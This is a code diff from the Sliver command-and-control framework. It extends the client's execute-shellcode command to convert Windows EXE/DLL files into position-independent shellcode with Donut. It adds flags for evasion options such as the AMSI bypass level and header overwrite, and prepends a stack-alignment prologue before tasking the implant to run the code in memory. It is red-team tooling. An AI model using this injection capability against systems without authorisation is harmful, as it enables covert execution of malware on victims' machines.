@@ -20,19 +20,33 @@ package exec
 
 import (
 	"bufio"
+	"bytes"
 	"context"
 	"fmt"
 	"io"
 	"log"
 	"os"
+	"path/filepath"
+	"strings"
 
+	"github.com/Binject/debug/pe"
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/core"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	wasmdonut "github.com/sliverarmory/wasm-donut"
 	"github.com/spf13/cobra"
 	"golang.org/x/term"
 	"google.golang.org/protobuf/proto"
+)
+
+const (
+	defaultExecuteShellcodeDonutEntropy  = wasmdonut.DonutEntropyNone
+	defaultExecuteShellcodeDonutCompress = wasmdonut.DonutCompressNone
+	defaultExecuteShellcodeDonutExitOpt  = wasmdonut.DonutExitThread
+	defaultExecuteShellcodeDonutBypass   = wasmdonut.DonutBypassContinue
+	defaultExecuteShellcodeDonutHeaders  = wasmdonut.DonutHeadersOverwrite
+	imageFileDLLMask                     = 0x2000
 )
 
 // ExecuteShellcodeCmd - Execute shellcode in-memory.
@@ -41,6 +55,9 @@ func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.SliverClient, args []s
 	if session == nil && beacon == nil {
 		return
 	}
+	targetName := activeTargetName(session, beacon)
+	targetOS := activeTargetOS(session, beacon)
+	targetArch := activeTargetArch(session, beacon)
 
 	rwxPages, _ := cmd.Flags().GetBool("rwx-pages")
 	interactive, _ := cmd.Flags().GetBool("interactive")
@@ -60,6 +77,27 @@ func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.SliverClient, args []s
 		con.PrintErrorf("Cannot use both `--pid` and `--interactive`\n")
 		return
 	}
+
+	shellcodeConfig, shellcodeFlagsChanged, err := parseExecuteShellcodeFlags(cmd)
+	if err != nil {
+		con.PrintErrorf("%s\n", err)
+		return
+	}
+
+	shouldConvertPE, isDLLHint := shouldConvertExecuteShellcodePE(shellcodePath, shellcodeFlagsChanged)
+	if shouldConvertPE {
+		if targetOS != "windows" {
+			con.PrintErrorf("PE input and --shellcode-* options are only supported for Windows targets in execute-shellcode\n")
+			return
+		}
+		con.PrintInfof("Converting PE input to shellcode ...\n")
+		shellcodeBin, err = donutShellcodeFromPE(shellcodeBin, targetArch, isDLLHint, shellcodeConfig)
+		if err != nil {
+			con.PrintErrorf("Failed to convert PE input to shellcode: %s\n", err)
+			return
+		}
+	}
+
 	shikataGaNai, _ := cmd.Flags().GetBool("shikata-ga-nai")
 	if shikataGaNai {
 		if !rwxPages {
@@ -96,7 +134,7 @@ func ExecuteShellcodeCmd(cmd *cobra.Command, con *console.SliverClient, args []s
 		return
 	}
 	ctrl := make(chan bool)
-	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
+	msg := fmt.Sprintf("Sending shellcode to %s ...", targetName)
 	con.SpinUntil(msg, ctrl)
 	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
 		Data:     shellcodeBin,
@@ -133,6 +171,186 @@ func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverClient) {
 	} else {
 		con.PrintInfof("Executed shellcode on target\n")
 	}
+}
+
+func parseExecuteShellcodeFlags(cmd *cobra.Command) (*clientpb.ShellcodeConfig, bool, error) {
+	shellcodeEntropy, _ := cmd.Flags().GetUint32("shellcode-entropy")
+	shellcodeCompressEnabled, _ := cmd.Flags().GetBool("shellcode-compress")
+	shellcodeExitOpt, _ := cmd.Flags().GetUint32("shellcode-exitopt")
+	shellcodeBypass, _ := cmd.Flags().GetUint32("shellcode-bypass")
+	shellcodeHeaders, _ := cmd.Flags().GetUint32("shellcode-headers")
+	shellcodeThread, _ := cmd.Flags().GetBool("shellcode-thread")
+	shellcodeUnicode, _ := cmd.Flags().GetBool("shellcode-unicode")
+	shellcodeOEP, _ := cmd.Flags().GetUint32("shellcode-oep")
+
+	anyChanged := cmd.Flags().Changed("shellcode-entropy") ||
+		cmd.Flags().Changed("shellcode-compress") ||
+		cmd.Flags().Changed("shellcode-exitopt") ||
+		cmd.Flags().Changed("shellcode-bypass") ||
+		cmd.Flags().Changed("shellcode-headers") ||
+		cmd.Flags().Changed("shellcode-thread") ||
+		cmd.Flags().Changed("shellcode-unicode") ||
+		cmd.Flags().Changed("shellcode-oep")
+
+	if shellcodeEntropy < 1 || shellcodeEntropy > 3 {
+		return nil, false, fmt.Errorf("shellcode-entropy must be between 1 and 3")
+	}
+	if shellcodeExitOpt < 1 || shellcodeExitOpt > 3 {
+		return nil, false, fmt.Errorf("shellcode-exitopt must be between 1 and 3")
+	}
+	if shellcodeBypass < 1 || shellcodeBypass > 3 {
+		return nil, false, fmt.Errorf("shellcode-bypass must be between 1 and 3")
+	}
+	if shellcodeHeaders < 1 || shellcodeHeaders > 2 {
+		return nil, false, fmt.Errorf("shellcode-headers must be 1 or 2")
+	}
+
+	shellcodeCompress := uint32(1)
+	if shellcodeCompressEnabled {
+		shellcodeCompress = 2
+	}
+
+	return &clientpb.ShellcodeConfig{
+		Entropy:  shellcodeEntropy,
+		Compress: shellcodeCompress,
+		ExitOpt:  shellcodeExitOpt,
+		Bypass:   shellcodeBypass,
+		Headers:  shellcodeHeaders,
+		Thread:   shellcodeThread,
+		Unicode:  shellcodeUnicode,
+		OEP:      shellcodeOEP,
+	}, anyChanged, nil
+}
+
+func shouldConvertExecuteShellcodePE(shellcodePath string, shellcodeFlagsChanged bool) (bool, bool) {
+	ext := strings.ToLower(filepath.Ext(shellcodePath))
+	isPEByExt := ext == ".exe" || ext == ".dll"
+	return isPEByExt || shellcodeFlagsChanged, ext == ".dll"
+}
+
+func activeTargetName(session *clientpb.Session, beacon *clientpb.Beacon) string {
+	if session != nil {
+		return session.GetName()
+	}
+	if beacon != nil {
+		return beacon.GetName()
+	}
+	return "target"
+}
+
+func activeTargetOS(session *clientpb.Session, beacon *clientpb.Beacon) string {
+	if session != nil {
+		return strings.ToLower(session.GetOS())
+	}
+	if beacon != nil {
+		return strings.ToLower(beacon.GetOS())
+	}
+	return ""
+}
+
+func activeTargetArch(session *clientpb.Session, beacon *clientpb.Beacon) string {
+	if session != nil {
+		return session.GetArch()
+	}
+	if beacon != nil {
+		return beacon.GetArch()
+	}
+	return ""
+}
+
+type executeShellcodeDonutOptions struct {
+	entropy  int
+	compress int
+	exitOpt  int
+	bypass   int
+	headers  int
+	thread   bool
+	unicode  bool
+	oep      uint32
+}
+
+func normalizeExecuteShellcodeDonutConfig(config *clientpb.ShellcodeConfig) executeShellcodeDonutOptions {
+	opts := executeShellcodeDonutOptions{
+		entropy:  defaultExecuteShellcodeDonutEntropy,
+		compress: defaultExecuteShellcodeDonutCompress,
+		exitOpt:  defaultExecuteShellcodeDonutExitOpt,
+		bypass:   defaultExecuteShellcodeDonutBypass,
+		headers:  defaultExecuteShellcodeDonutHeaders,
+	}
+	if config == nil {
+		return opts
+	}
+	if config.Entropy >= 1 && config.Entropy <= 3 {
+		opts.entropy = int(config.Entropy)
+	}
+	if config.Compress >= 1 && config.Compress <= 2 {
+		opts.compress = int(config.Compress)
+	}
+	if config.ExitOpt >= 1 && config.ExitOpt <= 3 {
+		opts.exitOpt = int(config.ExitOpt)
+	}
+	if config.Bypass >= 1 && config.Bypass <= 3 {
+		opts.bypass = int(config.Bypass)
+	}
+	if config.Headers >= 1 && config.Headers <= 2 {
+		opts.headers = int(config.Headers)
+	}
+	opts.thread = config.Thread
+	opts.unicode = config.Unicode
+	if config.OEP > 0 {
+		opts.oep = config.OEP
+	}
+	return opts
+}
+
+func donutShellcodeFromPE(data []byte, arch string, isDLLHint bool, config *clientpb.ShellcodeConfig) ([]byte, error) {
+	peFile, err := pe.NewFile(bytes.NewReader(data))
+	if err != nil {
+		return nil, err
+	}
+	isDLL := isDLLHint || ((peFile.FileHeader.Characteristics & imageFileDLLMask) != 0)
+	ext := ".exe"
+	if isDLL {
+		ext = ".dll"
+	}
+	opts := normalizeExecuteShellcodeDonutConfig(config)
+	result, err := wasmdonut.Generate(context.Background(), data, ext, wasmdonut.GenerateOptions{
+		Ext:      ext,
+		Arch:     getExecuteShellcodeDonutArch(arch),
+		Bypass:   opts.bypass,
+		Headers:  opts.headers,
+		Entropy:  opts.entropy,
+		Compress: opts.compress,
+		ExitOpt:  opts.exitOpt,
+		Thread:   opts.thread,
+		Unicode:  opts.unicode,
+		OEP:      opts.oep,
+	})
+	if err != nil {
+		return nil, err
+	}
+	return addExecuteShellcodeStackCheck(result.Loader), nil
+}
+
+func getExecuteShellcodeDonutArch(arch string) int {
+	donutArch := wasmdonut.DonutArchX84
+	switch strings.ToLower(arch) {
+	case "x32", "x86", "386":
+		donutArch = wasmdonut.DonutArchX86
+	case "x64", "amd64":
+		donutArch = wasmdonut.DonutArchX64
+	case "x84":
+		donutArch = wasmdonut.DonutArchX84
+	}
+	return donutArch
+}
+
+func addExecuteShellcodeStackCheck(shellcode []byte) []byte {
+	stackCheckPrologue := []byte{
+		0x48, 0x83, 0xE4, 0xF0, // and rsp,0xfffffffffffffff0
+		0x48, 0x83, 0xC4, 0x08, // add rsp,0x8
+	}
+	return append(stackCheckPrologue, shellcode...)
 }
 
 func executeInteractive(cmd *cobra.Command, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverClient) {
